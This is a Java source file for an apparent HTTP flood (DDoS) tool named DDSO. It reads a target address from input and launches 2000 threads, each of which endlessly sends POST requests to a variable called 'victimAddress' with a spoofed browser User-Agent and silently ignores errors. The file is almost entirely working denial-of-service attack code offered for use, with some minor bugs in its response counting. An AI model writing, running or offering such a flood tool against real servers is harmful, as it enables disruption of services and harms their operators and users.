package main;

import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;
import java.util.Scanner;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;

public class DDSO { 
	
	public String[] responses= new String[40];
	public static HashMap< Integer, Integer> responseMap = new HashMap< Integer, Integer>();
	public String host; 
	public static String victimAddress= "http://10.9.215.220:3000/";
	public static String attackerHOST="192.168.0.1:8080";
 
	public static Scanner scanner = new Scanner(System.in);
	
    public static void main(String... args) throws Exception {
    	String hostAddress ="";
    	do {
    		hostAddress = scanner.nextLine();
    	}while(hostAddress.equals(""));
    	victimAddress= hostAddress;
        for (int i = 0; i < 2000; i++) {
        	
            DdosThread thread = new DdosThread( );
            thread.start();
        } 
    }
    public static class DdosThread extends Thread {
 
        private AtomicBoolean running = new AtomicBoolean(true);
        private String request = victimAddress;
        private final URL url;
 
        String param = null;
        public DdosThread() throws Exception {
            url = new URL(request);
            param = "param1=" + URLEncoder.encode("87845", "UTF-8");
        }
        @Override 
        public void run() { 
            while (running.get()) {
                try { 
                    attack(); 
                } catch (Exception e) {
                }
            } 
        }
        
        
        
        public void attack() throws Exception {
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setDoOutput(true);
            connection.setDoInput(true);
            connection.setRequestMethod("POST");
            connection.setRequestProperty("charset", "utf-8");
            connection.setRequestProperty("Host", "localhost");
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0");
            connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            connection.setRequestProperty("Content-Length", param);
            System.out.println(this + " " + connection.getResponseCode());
            
            Integer res = responseMap.get(connection.getResponseCode());
            responseMap.put(connection.getResponseCode(), res+1);
            connection.getInputStream();
        } 
    } 
 
}